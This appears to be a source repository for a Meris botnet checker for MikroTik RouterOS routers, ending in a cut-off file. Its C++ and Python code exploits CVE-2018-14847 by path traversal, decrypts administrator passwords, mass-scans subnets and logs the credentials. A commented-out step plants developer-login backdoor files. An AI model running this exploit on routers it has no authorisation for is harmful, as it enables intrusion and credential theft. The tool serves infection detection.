a modified version of its Corresponding Source.  The information must
suffice to ensure that the continued functioning of the modified object
code is in no case prevented or interfered with solely because
modification has been made.

  If you convey an object code work under this section in, or with, or
specifically for use in, a User Product, and the conveying occurs as
part of a transaction in which the right of possession and use of the
User Product is transferred to the recipient in perpetuity or for a
fixed term (regardless of how the transaction is characterized), the
Corresponding Source conveyed under this section must be accompanied
by the Installation Information.  But this requirement does not apply
if neither you nor any third party retains the ability to install
modified object code on the User Product (for example, the work has
been installed in ROM).

  The requirement to provide Installation Information does not include a
requirement to continue to provide support service, warranty, or updates
for a work that has been modified or installed by the recipient, or for
the User Product in which it has been modified or installed.  Access to a
network may be denied when the modification itself materially and
adversely affects the operation of the network or violates the rules and
protocols for communication across the network.

  Corresponding Source conveyed, and Installation Information provided,
in accord with this section must be in a format that is publicly
documented (and with an implementation available to the public in
source code form), and must require no special password or key for
unpacking, reading or copying.

  7. Additional Terms.

  "Additional permissions" are terms that supplement the terms of this
License by making exceptions from one or more of its conditions.
Additional permissions that are applicable to the entire Program shall
be treated as though they were included in this License, to the extent
that they are valid under applicable law.  If additional permissions
apply only to part of the Program, that part may be used separately
under those permissions, but the entire Program remains governed by
this License without regard to the additional permissions.

  When you convey a copy of a covered work, you may at your option
remove any additional permissions from that copy, or from any part of
it.  (Additional permissions may be written to require their own
removal in certain cases when you modify the work.)  You may place
additional permissions on material, added by you to a covered work,
for which you have or can give appropriate copyright permission.

  Notwithstanding any other provision of this License, for material you
add to a covered work, you may (if authorized by the copyright holders of
that material) supplement the terms of this License with terms:

    a) Disclaiming warranty or limiting liability differently from the
    terms of sections 15 and 16 of this License; or

    b) Requiring preservation of specified reasonable legal notices or
    author attributions in that material or in the Appropriate Legal
    Notices displayed by works containing it; or

    c) Prohibiting misrepresentation of the origin of that material, or
    requiring that modified versions of such material be marked in
    reasonable ways as different from the original version; or

    d) Limiting the use for publicity purposes of names of licensors or
    authors of the material; or

    e) Declining to grant rights under trademark law for use of some
    trade names, trademarks, or service marks; or

    f) Requiring indemnification of licensors and authors of that
    material by anyone who conveys the material (or modified versions of
    it) with contractual assumptions of liability to the recipient, for
    any liability that these contractual assumptions directly impose on
    those licensors and authors.

  All other non-permissive additional terms are considered "further
restrictions" within the meaning of section 10.  If the Program as you
received it, or any part of it, contains a notice stating that it is
governed by this License along with a term that is a further
restriction, you may remove that term.  If a license document contains
a further restriction but permits relicensing or conveying under this
License, you may add to a covered work material governed by the terms
of that license document, provided that the further restriction does
not survive such relicensing or conveying.

  If you add terms to a covered work in accord with this section, you
must place, in the relevant source files, a statement of the
additional terms that apply to those files, or a notice indicating
where to find the applicable terms.

  Additional terms, permissive or non-permissive, may be stated in the
form of a separately written license, or stated as exceptions;
the above requirements apply either way.

  8. Termination.

  You may not propagate or modify a covered work except as expressly
provided under this License.  Any attempt otherwise to propagate or
modify it is void, and will automatically terminate your rights under
this License (including any patent licenses granted under the third
paragraph of section 11).

  However, if you cease all violation of this License, then your
license from a particular copyright holder is reinstated (a)
provisionally, unless and until the copyright holder explicitly and
finally terminates your license, and (b) permanently, if the copyright
holder fails to notify you of the violation by some reasonable means
prior to 60 days after the cessation.

  Moreover, your license from a particular copyright holder is
reinstated permanently if the copyright holder notifies you of the
violation by some reasonable means, this is the first time you have
received notice of violation of this License (for any work) from that
copyright holder, and you cure the violation prior to 30 days after
your receipt of the notice.

  Termination of your rights under this section does not terminate the
licenses of parties who have received copies or rights from you under
this License.  If your rights have been terminated and not permanently
reinstated, you do not qualify to receive new licenses for the same
material under section 10.

  9. Acceptance Not Required for Having Copies.

  You are not required to accept this License in order to receive or
run a copy of the Program.  Ancillary propagation of a covered work
occurring solely as a consequence of using peer-to-peer transmission
to receive a copy likewise does not require acceptance.  However,
nothing other than this License grants you permission to propagate or
modify any covered work.  These actions infringe copyright if you do
not accept this License.  Therefore, by modifying or propagating a
covered work, you indicate your acceptance of this License to do so.

  10. Automatic Licensing of Downstream Recipients.

  Each time you convey a covered work, the recipient automatically
receives a license from the original licensors, to run, modify and
propagate that work, subject to this License.  You are not responsible
for enforcing compliance by third parties with this License.

  An "entity transaction" is a transaction transferring control of an
organization, or substantially all assets of one, or subdividing an
organization, or merging organizations.  If propagation of a covered
work results from an entity transaction, each party to that
transaction who receives a copy of the work also receives whatever
licenses to the work the party's predecessor in interest had or could
give under the previous paragraph, plus a right to possession of the
Corresponding Source of the work from the predecessor in interest, if
the predecessor has it or can get it with reasonable efforts.

  You may not impose any further restrictions on the exercise of the
rights granted or affirmed under this License.  For example, you may
not impose a license fee, royalty, or other charge for exercise of
rights granted under this License, and you may not initiate litigation
(including a cross-claim or counterclaim in a lawsuit) alleging that
any patent claim is infringed by making, using, selling, offering for
sale, or importing the Program or any portion of it.

  11. Patents.

  A "contributor" is a copyright holder who authorizes use under this
License of the Program or a work on which the Program is based.  The
work thus licensed is called the contributor's "contributor version".

  A contributor's "essential patent claims" are all patent claims
owned or controlled by the contributor, whether already acquired or
hereafter acquired, that would be infringed by some manner, permitted
by this License, of making, using, or selling its contributor version,
but do not include claims that would be infringed only as a
consequence of further modification of the contributor version.  For
purposes of this definition, "control" includes the right to grant
patent sublicenses in a manner consistent with the requirements of
this License.

  Each contributor grants you a non-exclusive, worldwide, royalty-free
patent license under the contributor's essential patent claims, to
make, use, sell, offer for sale, import and otherwise run, modify and
propagate the contents of its contributor version.

  In the following three paragraphs, a "patent license" is any express
agreement or commitment, however denominated, not to enforce a patent
(such as an express permission to practice a patent or covenant not to
sue for patent infringement).  To "grant" such a patent license to a
party means to make such an agreement or commitment not to enforce a
patent against the party.

  If you convey a covered work, knowingly relying on a patent license,
and the Corresponding Source of the work is not available for anyone
to copy, free of charge and under the terms of this License, through a
publicly available network server or other readily accessible means,
then you must either (1) cause the Corresponding Source to be so
available, or (2) arrange to deprive yourself of the benefit of the
patent license for this particular work, or (3) arrange, in a manner
consistent with the requirements of this License, to extend the patent
license to downstream recipients.  "Knowingly relying" means you have
actual knowledge that, but for the patent license, your conveying the
covered work in a country, or your recipient's use of the covered work
in a country, would infringe one or more identifiable patents in that
country that you have reason to believe are valid.

  If, pursuant to or in connection with a single transaction or
arrangement, you convey, or propagate by procuring conveyance of, a
covered work, and grant a patent license to some of the parties
receiving the covered work authorizing them to use, propagate, modify
or convey a specific copy of the covered work, then the patent license
you grant is automatically extended to all recipients of the covered
work and works based on it.

  A patent license is "discriminatory" if it does not include within
the scope of its coverage, prohibits the exercise of, or is
conditioned on the non-exercise of one or more of the rights that are
specifically granted under this License.  You may not convey a covered
work if you are a party to an arrangement with a third party that is
in the business of distributing software, under which you make payment
to the third party based on the extent of your activity of conveying
the work, and under which the third party grants, to any of the
parties who would receive the covered work from you, a discriminatory
patent license (a) in connection with copies of the covered work
conveyed by you (or copies made from those copies), or (b) primarily
for and in connection with specific products or compilations that
contain the covered work, unless you entered into that arrangement,
or that patent license was granted, prior to 28 March 2007.

  Nothing in this License shall be construed as excluding or limiting
any implied license or other defenses to infringement that may
otherwise be available to you under applicable patent law.

  12. No Surrender of Others' Freedom.

  If conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot convey a
covered work so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you may
not convey it at all.  For example, if you agree to terms that obligate you
to collect a royalty for further conveying from those to whom you convey
the Program, the only way you could satisfy both those terms and this
License would be to refrain entirely from conveying the Program.

  13. Use with the GNU Affero General Public License.

  Notwithstanding any other provision of this License, you have
permission to link or combine any covered work with a work licensed
under version 3 of the GNU Affero General Public License into a single
combined work, and to convey the resulting work.  The terms of this
License will continue to apply to the part which is the covered work,
but the special requirements of the GNU Affero General Public License,
section 13, concerning interaction through a network will apply to the
combination as such.

  14. Revised Versions of this License.

  The Free Software Foundation may publish revised and/or new versions of
the GNU General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

  Each version is given a distinguishing version number.  If the
Program specifies that a certain numbered version of the GNU General
Public License "or any later version" applies to it, you have the
option of following the terms and conditions either of that numbered
version or of any later version published by the Free Software
Foundation.  If the Program does not specify a version number of the
GNU General Public License, you may choose any version ever published
by the Free Software Foundation.

  If the Program specifies that a proxy can decide which future
versions of the GNU General Public License can be used, that proxy's
public statement of acceptance of a version permanently authorizes you
to choose that version for the Program.

  Later license versions may give you additional or different
permissions.  However, no additional obligations are imposed on any
author or copyright holder as a result of your choosing to follow a
later version.

  15. Disclaimer of Warranty.

  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

  16. Limitation of Liability.

  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS
THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
SUCH DAMAGES.

  17. Interpretation of Sections 15 and 16.

  If the disclaimer of warranty and limitation of liability provided
above cannot be given local legal effect according to their terms,
reviewing courts shall apply local law that most closely approximates
an absolute waiver of all civil liability in connection with the
Program, unless a warranty or assumption of liability accompanies a
copy of the Program in return for a fee.

                     END OF TERMS AND CONDITIONS

            How to Apply These Terms to Your New Programs

  If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

  To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
state the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

    <one line to give the program's name and a brief idea of what it does.>
    Copyright (C) <year>  <name of author>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

Also add information on how to contact you by electronic and paper mail.

  If the program does terminal interaction, make it output a short
notice like this when it starts in an interactive mode:

    <program>  Copyright (C) <year>  <name of author>
    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.

The hypothetical commands `show w' and `show c' should show the appropriate
parts of the General Public License.  Of course, your program's commands
might be different; for a GUI interface, you would use an "about box".

  You should also get your employer (if you work as a programmer) or school,
if any, to sign a "copyright disclaimer" for the program, if necessary.
For more information on this, and how to apply and follow the GNU GPL, see
<https://www.gnu.org/licenses/>.

  The GNU General Public License does not permit incorporating your program
into proprietary programs.  If your program is a subroutine library, you
may consider it more useful to permit linking proprietary applications with
the library.  If this is what you want to do, use the GNU Lesser General
Public License instead of this License.  But first, please read
<https://www.gnu.org/licenses/why-not-lgpl.html>.


File: /meris_checker.py
import ipaddress
import argparse
import subprocess
import csv
import os
import stat
import re
import sys
import routeros_api
import routeros_api.exceptions
import paramiko

from concurrent.futures import ThreadPoolExecutor


# HELPER METHODS #
def read_file(filename):
    with open(filename, 'r', encoding='utf-8') as opened_file:
        return opened_file.read()


def make_binary_executable(name: str):
    st = os.stat(name)
    os.chmod(name, st.st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)


def indicators_loader():
    return [x.strip()
            for x in read_file('indicators.txt').split('\n')
            if len(x.strip()) != 0]


def credentials_loader():
    credentials = [x.strip()
                   for x in read_file('credentials.txt').split("\n")
                   if len(x.strip()) != 0]

    split_credentials = [x.split(":", 1) for x in credentials]

    return split_credentials


def ioc_tester(indicators, content):
    for ioc in indicators:
        if ioc in content.lower():
            return True

    return False


def has_suspicious_url(content):
    hex_g = "[0-9a-fA-F]"
    uuid = hex_g + "{8}-" + hex_g + "{4}-" + hex_g + "{4}-" + hex_g + "{4}-" + hex_g + "{12}"
    sus_regex = re.compile("(https?://[^/]+/poll/" + uuid+")")

    return sus_regex.findall(content)
# END HELPER METHODS #


iocs = indicators_loader()
creds = credentials_loader()


# COMMUNICATION #
def connect_api(host, login, password):
    conn = routeros_api.RouterOsApiPool(
        host,
        port=8728,
        use_ssl=False,
        username=login,
        password=password,
        plaintext_login=True
    )
    try:
        api = conn.get_api()
    except routeros_api.exceptions.RouterOsApiCommunicationError:
        conn = routeros_api.RouterOsApiPool(
            host,
            port=8728,
            use_ssl=False,
            username=login,
            password=password,
            plaintext_login=False
        )
        try:
            api = conn.get_api()
        except routeros_api.exceptions.RouterOsApiCommunicationError as comm_error:
            raise Exception("Not connected") from comm_error

    # Here we have API
    return api.get_resource("/system/scheduler").call("print")


def exploit_winbox(address):
    cred_re = re.compile("credentials - ([\\s\\S]*)\\r?\\n")
    try:
        so = subprocess.check_output(["./btw", "--ip", address], stderr=subprocess.STDOUT)
        so = so.decode("utf-8")
        if "credentials - " in so:
            credentials = cred_re.findall(so)
            if len(credentials) != 0:
                found_credentials = credentials[0]
                split_credentials = found_credentials.split(":")
                login = split_credentials[0]
                pwd = ':'.join(split_credentials[1:])
                return [[login, pwd]]
            return []
        return []
    except:
        return []


def connect_winbox(address, login, pwd):
    so2 = subprocess.check_output([
        "./btw_stage2", "--ip", address, "--login", login, "--password", pwd
        ],
        stderr=subprocess.STDOUT
    )

    return so2.decode('utf-8')


def connect_ssh(address, login, pwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
    client.load_system_host_keys()
    client.connect(hostname=address,
                   username=login,
                   password=pwd)
    stdin, stdout, stderr = client.exec_command("/system scheduler export")

    out = stdout.read().decode().strip()
    error = stderr.read().decode().strip()

    return out + error
# END COMMUNICATION #


# SINGLE-IP LOGIC #
def exploit_ip(address: str):
    """
    This method exploits a single ip address
    :param address: IPv4 address string
    :return: ip, status, credentials (or emtpy string)
    """

    # global creds
    # global iocs

    creds_for_host = exploit_winbox(address)
    all_creds = creds_for_host + creds

    is_exploitable = len(creds_for_host) != 0
    if is_exploitable:
        is_exploitable = "EXPLOITABLE"
    else:
        is_exploitable = "NOT_EXPLOITABLE"

    for cred_pair in all_creds:
        try:
            scheduler_listing = [connect_ssh(address, cred_pair[0], cred_pair[1])]
        except:
            try:
                scheduler_listing = connect_api(address, cred_pair[0], cred_pair[1])
            except:
                try:

                    scheduler_listing = [connect_winbox(address, cred_pair[0], cred_pair[1])]
                    bad_strs = [
                        "[-] Failed to connect to the remote host",
                        "[!] Error receiving an open file response.",
                        "[-] Login failed."
                    ]
                    for x in bad_strs:
                        if x in scheduler_listing[0]:
                            raise Exception("Not connected")
                except:
                    continue

        found_ioc = False
        suspicious_strings = []
        for item in scheduler_listing:
            found_ioc = found_ioc or ioc_tester(iocs, item)
            suspicious_strings += has_suspicious_url(item)

        joined_strs = ';'.join(suspicious_strings)
        status_str = "NOT_INFECTED"
        if len(suspicious_strings) != 0:
            status_str = "LIKELY_INFECTED"

        if found_ioc:
            status_str = "INFECTED"

        return address, status_str, is_exploitable, joined_strs, cred_pair[0] + ":" + cred_pair[1]

    return address, "NOT_CONNECTED", "", "", ""
# END SINGLE-IP LOGIC #


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='BTW multithreaded runner'
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--ip", type=str, nargs='+', help="IPv4 addresses or subnets to scan")
    group.add_argument("--ipfile", type=str, help="IPv4 Listing file")
    parser.add_argument("--threads", type=int, help="Number of threads (default 16)", default=16)

    args = parser.parse_args()

    # Make winbox binaries executable
    make_binary_executable('btw')
    make_binary_executable('btw_stage2')

    final_ip_listing = set()

    if args.ip is None:
        ff = read_file(args.ipfile)
        ips = [x.strip() for x in ff.split('\n') if len(x.strip()) != 0]
    else:
        ips = args.ip

    for ip in ips:
        if "/" in ip:
            try:
                ip_net = ipaddress.ip_network(ip, strict=False)
                for h in ip_net.hosts():
                    final_ip_listing.add(str(h))
            except ValueError as e:
                print("[-] Invalid IP network provided: " + ip)
                sys.exit(1)
        else:
            final_ip_listing.add(ip)

    final_listing = []

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        results = pool.map(exploit_ip, list(final_ip_listing))
        with open("exploited.csv", "w", encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(["IP", "Status", "Exploitable", "IOCs", "Credentials Used"])
            # Stream the file
            for r in results:
                writer.writerow(r)
                f.flush()


File: /README.md
# Meris RouterOS Checker

This tool will check a list of ip addresses of RouterOS-based routers to validate if they were infected with Meris.

The tool will:
- Attempt to connect using credentials in credentials.txt file (1 pair of credentials per line, default provided)
- Attempt to exploit the router using CVE-2018-14847

The tool supports:
- RouterOS API
- SSH
- WinBox (tested for <= 6.42)

The tool uses:
- Modified version of https://github.com/tenable/routeros/tree/master/poc/bytheway (by tenable) for WinBox operations
- RouterOS API module (https://pypi.org/project/RouterOS-api/) for RouterOS API operations
- paramiko for ssh operations

The tool will output exploited.csv file with a table of results for each provided IP address.

**Note**: To build modified version of bytheway, use provided cpp files instead of original main.cpp when building. 
You need to name the binaries `btw` and `btw_stage2` respectively, and put them next to the tool

# Detection rules
The tool will attempt to list scheduler scripts, and attempt to check if it contains any IoCs listed in `indicators.txt`.
The tool will also attempt to match scheduler scripts contents to the regex 
`https?://[^/]+/poll/[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}`, and flag the matches
as possible infections.

# Tool usage
The tool requires either an `--ip` or `--ipfile` option.

`--ip` option takes a single ip address as input, `--ipfile` takes a file with a list of ips, one ip per file, as input.

Optionally, `--threads` can be used to tune the number of threads, with default being 16.


File: /req.txt
ipaddress==1.0.23
routeros_api==0.17.0
paramiko==2.7.2


File: /stage1_main.cpp
/*
    Copyright 2018-2019 Tenable, Inc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                *

    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice, this
        list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software
        without specific prior written permission.

    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.
*/
#include <sstream>
#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>

#include "winbox_session.hpp"
#include "winbox_message.hpp"
#include "md5.hpp"

namespace
{
    const char s_version[] = "By the Way 1.1.0";

    /*!
     * Parses the command line arguments. The program will always use two
     * parameters (ip and winbox port) but the port will default to 8291 if
     * not present on the CLI
     *
     * \param[in] p_arg_count the number of arguments on the command line
     * \param[in] p_arg_array the arguments passed on the command line
     * \param[in,out] p_ip the ip address to connect to
     * \param[in,out] p_winbox_port the winbox port to connect to
     * \return true if we have valid ip and ports. false otherwise.
     */
    bool parseCommandLine(int p_arg_count, const char* p_arg_array[],
                          std::string& p_ip, std::string& p_winbox_port)
    {
        boost::program_options::options_description description("options");
        description.add_options()
        ("help,h", "A list of command line options")
        ("version,v", "Display version information")
        ("winbox-port,w", boost::program_options::value<std::string>()->default_value("8291"), "The winbox port")
        ("ip,i", boost::program_options::value<std::string>(), "The ip to connect to");

        boost::program_options::variables_map argv_map;
        try
        {
            boost::program_options::store(
                boost::program_options::parse_command_line(
                    p_arg_count, p_arg_array, description), argv_map);
        }
        catch (const std::exception& e)
        {
            std::cerr << e.what() << "\n" << std::endl;
            std::cerr << description << std::endl;
            return false;
        }

        boost::program_options::notify(argv_map);
        if (argv_map.empty() || argv_map.count("help"))
        {
            std::cerr << description << std::endl;
            return false;
        }

        if (argv_map.count("version"))
        {
            std::cerr << "Version: " << ::s_version << std::endl;
            return false;
        }

        if (argv_map.count("ip") && argv_map.count("winbox-port"))
        {
            p_ip.assign(argv_map["ip"].as<std::string>());
            p_winbox_port.assign(argv_map["winbox-port"].as<std::string>());
            return true;
        }
        else
        {
            std::cerr << description << std::endl;
        }

        return false;
    }

    /*!
     * This function uses the file disclosure vulnerability, CVE-2018-14847, to
     * download the user database from /flash/rw/store/user.dat
     *
     * \param[in] p_ip the address of the router to connect to
     * \param[in] p_winbox_port the winbox port to connect to
     * \return a string containing the user.dat data or an empty string on error
     */
    std::string getPasswords(const std::string& p_ip, const std::string& p_winbox_port)
    {
        std::cout << "[+] Attempting to connect to " << p_ip << ":" << p_winbox_port << std::endl;
        Winbox_Session winboxSession(p_ip, p_winbox_port);
        if (!winboxSession.connect())
        {
            std::cerr << "[!] Failed to connect to the remote host" << std::endl;
            return std::string();
        }

        std::cout << "[+] Extracting user.dat..." << std::endl;

        WinboxMessage msg;
        msg.set_to(2, 2);
        msg.set_command(7);
        msg.set_request_id(1);
        msg.set_reply_expected(true);
        msg.add_string(1, "//./.././.././../flash/rw/store/user.dat");
        winboxSession.send(msg);

        msg.reset();
        if (!winboxSession.receive(msg))
        {
            std::cerr << "[!] Error receiving an open file response." << std::endl;
            return std::string();
        }

        boost::uint32_t sessionID = msg.get_session_id();
        boost::uint16_t file_size = msg.get_u32(2);
        if (file_size == 0)
        {
            std::cerr << "[!] File size is 0" << std::endl;
            return std::string();
        }

        msg.reset();
        msg.set_to(2, 2);
        msg.set_command(4);
        msg.set_request_id(2);
        msg.set_reply_expected(true);
        msg.set_session_id(sessionID);
        msg.add_u32(2, file_size);
        winboxSession.send(msg);

        msg.reset();
        if (!winboxSession.receive(msg))
        {
            std::cerr << "[!] Error receiving a file content response." << std::endl;
            return std::string();
        }

        return msg.get_raw(0x03);
    }

    /*!
     * Looks through the user.dat file for an enabled administrative account that
     * we can use. Once a useful account is found the password is decrypted.
     *
     * \param[in] p_user_dat the user.dat file data
     * \param[in,out] p_username stores the found admin username
     * \param[in,out] p_password stores the found admin password
     * \return true on success and false otherwrise
     */
    bool get_password(const std::string p_user_dat, std::string& p_username, std::string& p_password)
    {
        std::cout << "[+] Searching for administrator credentials " << std::endl;

        // the dat file is a series of nv::messages preceded by a two byte length
        std::string dat(p_user_dat);
        while (dat.size() > 4)
        {
            boost::uint16_t length = *reinterpret_cast<const boost::uint16_t*>(&dat[0]);
            if (dat[2] != 'M' || dat[3] != '2')
            {
                // this is mild insanity but the .dat file messages don't line
                // up properly if a new user is added or whatever.
                dat.erase(0, 1);
                continue;
            }
            dat.erase(0, 4);
            length -= 4;

            if (length > dat.size())
            {
                return false;
            }

            std::string entry(dat.data(), length);
            dat.erase(0, length);

            WinboxMessage msg;
            msg.parse_binary(entry);

            // we need an active admin account
            // 0x2 has three groups: 1 (read), 2 (write), 3 (full)
            if (msg.get_u32(2) == 3 && msg.get_boolean(0xfe000a) == false)
            {
                p_username.assign(msg.get_string(1));

                std::string encrypted_pass(msg.get_string(0x11));
                if (!encrypted_pass.empty() && msg.get_u32(0x1f) != 0)
                {
                    std::string hash_this(p_username);
                    hash_this.append("283i4jfkai3389");

                    MD5 md5;
                    md5.update(hash_this.c_str(), hash_this.size());
                    md5.finalize();
                    std::string md5_hash(md5.getDigest());

                    for (std::size_t i = 0; i < encrypted_pass.size(); i++)
                    {
                        boost::uint8_t decrypted = encrypted_pass[i] ^ md5_hash[i % md5_hash.size()];
                        if (decrypted == 0)
                        {
                            // a null terminator! We did it.
                            return true;
                        }
                        p_password.push_back(decrypted);
                    }

                    // not everything is null terminated. Kind of annoying. Let's
                    // loop over the result and see if everything is ascii. If
                    // so we can roll with that.
                    bool good = true;
                    for (std::size_t i = 0; i < p_password.size() && good; i++)
                    {
                        if (((unsigned char)p_password[i]) < 0x20 ||
                            ((unsigned char)p_password[i]) > 0x7f)
                        {
                            good = false;
                        }
                    }

                    if (good)
                    {
                        return true;
                    }
                    p_password.clear();
                }
            }
        }
        return false;
    }
}

/*!
 * This function creates the file /pckg/option on the target. This will enable
 * the developer login on Telnet and SSH. Oddly, you'll first need to log in
 * to Telnet for SSH to work, but I digress...
 *
 * \param[in] p_ip the ip address of the router
 * \param[in] p_port the port of the jsproxy we'll connect to
 * \param[in] p_username the username we'll authenticate with
 * \param[in] p_password the password we'll authenticate with
 * \return true if we successfully created the file.
 */
bool create_file(const std::string& p_ip, const std::string& p_port,
                 const std::string& p_username, const std::string& p_password)
{
    Winbox_Session mproxy_session(p_ip, p_port);
    if (!mproxy_session.connect())
    {
        std::cerr << "[-] Failed to connect to the remote host" << std::endl;
        return false;
    }

    boost::uint32_t p_session_id = 0;
    if (!mproxy_session.login(p_username, p_password, p_session_id))
    {
        std::cerr << "[-] Login failed." << std::endl;
        return false;
    }

    std::cout << "[+] Creating /pckg/option on " << p_ip << ":" << p_port << std::endl;

    WinboxMessage msg;
    msg.set_to(2, 2);
    msg.set_command(1);
    msg.set_request_id(1);
    msg.set_reply_expected(true);
    msg.set_session_id(p_session_id);
    msg.add_string(1, "//./.././.././../pckg/option");
    mproxy_session.send(msg);

    msg.reset();
    mproxy_session.receive(msg);
    if (msg.has_error())
    {
        std::cout << "[-] " << msg.get_error_string() << std::endl;
        return false;
    }

    std::cout << "[+] Creating /flash/nova/etc/devel-login on " << p_ip << ":" << p_port << std::endl;
    msg.reset();
    msg.set_to(2, 2);
    msg.set_command(1);
    msg.set_request_id(2);
    msg.set_reply_expected(true);
    msg.set_session_id(p_session_id);
    msg.add_string(1, "//./.././.././../flash/nova/etc/devel-login");
    mproxy_session.send(msg);

    msg.reset();
    mproxy_session.receive(msg);
    if (msg.has_error())
    {
        std::cout << "[-] " << msg.get_error_string() << std::endl;
        return false;
    }

    return true;
}

int main(int p_argc, const char** p_argv)
{
    std::string ip;
    std::string winbox_port;
    if (!parseCommandLine(p_argc, p_argv, ip, winbox_port))
    {
        return EXIT_FAILURE;
    }

    std::cout << std::endl;
    std::cout << "   ╔╗ ┬ ┬  ┌┬┐┬ ┬┌─┐  ╦ ╦┌─┐┬ ┬" << std::endl;
    std::cout << "   ╠╩╗└┬┘   │ ├─┤├┤   ║║║├─┤└┬┘" << std::endl;
    std::cout << "   ╚═╝ ┴    ┴ ┴ ┴└─┘  ╚╩╝┴ ┴ ┴ " << std::endl;
    std::cout << std::endl;

    // step one - do the file disclosure
    std::string user_dat(getPasswords(ip, winbox_port));
    if (user_dat.empty())
    {
        return EXIT_FAILURE;
    }

    // step two - parse the password
    std::string admin_username;
    std::string admin_password;
    if (!get_password(user_dat, admin_username, admin_password))
    {
        std::cout << "[-] Failed to find admin creds. Trying default." << std::endl;
        admin_username.assign("admin");
        admin_password.assign("");
    }

    std::cout << "[+] Using credentials - " << admin_username << ":" << admin_password << std::endl;

    // step three - create the file
    //if (!create_file(ip, winbox_port, admin_username, admin_password))
    //{
    //    return EXIT_FAILURE;
    //}

    //std::cout << "[+] There's a light on" << std::endl;
    //return EXIT_SUCCESS;
}
 


File: /stage2_main.cpp
/*
    Copyright 2018-2019 Tenable, Inc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                *

    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice, this
        list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software
        without specific prior written permission.

